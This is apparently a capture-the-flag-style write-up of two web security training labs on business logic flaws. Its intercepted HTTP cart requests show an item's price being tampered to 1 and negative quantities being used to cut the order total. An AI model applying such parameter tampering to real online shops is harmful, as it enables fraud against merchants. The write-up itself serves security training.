# Business logic vulnerabilities


<details>
  <summary>Lab: Excessive trust in client-side controls</summary>

1. login using ``wiener:peter``
2. navigate ``home`` page and select product
3. Click ``add to cart`` with intercept the request

```http
POST /cart HTTP/1.1
Host: 0a43003003147e1c811880e3005d006f.web-security-academy.net
Cookie: session=4kC0DYbpfMKStrmFfEaBoLoLBYYPDH5K
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://0a43003003147e1c811880e3005d006f.web-security-academy.net
Referer: https://0a43003003147e1c811880e3005d006f.web-security-academy.net/product?productId=17
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive



productId=17&redir=PRODUCT&quantity=1&price=4817
```



set ``price`` to ``1``

```url
productId=17&redir=PRODUCT&quantity=1&price=1
```

back to cart and cilck ``place order``

![image](https://github.com/user-attachments/assets/2b7dbfc5-e7ed-4038-b01e-bb46220eaa69)



  
</details>







<details>
  <summary>Lab: High-level logic vulnerability</summary>

1. login using ``wiener:peter``
2. navigate ``home`` page and select product
3. Click ``add to cart`` with intercept the request

```http
POST /cart HTTP/1.1
Host: 0a43003003147e1c811880e3005d006f.web-security-academy.net
Cookie: session=4kC0DYbpfMKStrmFfEaBoLoLBYYPDH5K
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 48
Origin: https://0a43003003147e1c811880e3005d006f.web-security-academy.net
Referer: https://0a43003003147e1c811880e3005d006f.web-security-academy.net/product?productId=17
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive



productId=1&redir=PRODUCT&quantity=1
```

Notice that there is not ``price`` parameter but there is ``quantity`` try to put it with negative:

```url
productId=1&redir=PRODUCT&quantity=-1
```
notice that the price also became negative

![image](https://github.com/user-attachments/assets/b198bffa-1368-4b26-b5c1-5901bdd4fc4f)

if you click ``place order`` this error appear

```http
Cart total price cannot be less than zero
```

> ### now try to shoose sheap product and add it more than one time with negative and add the wanted product just one time with positive:

![image](https://github.com/user-attachments/assets/4a57f6fa-320e-400f-9596-54e2305cf0f3)


  
</details>



































































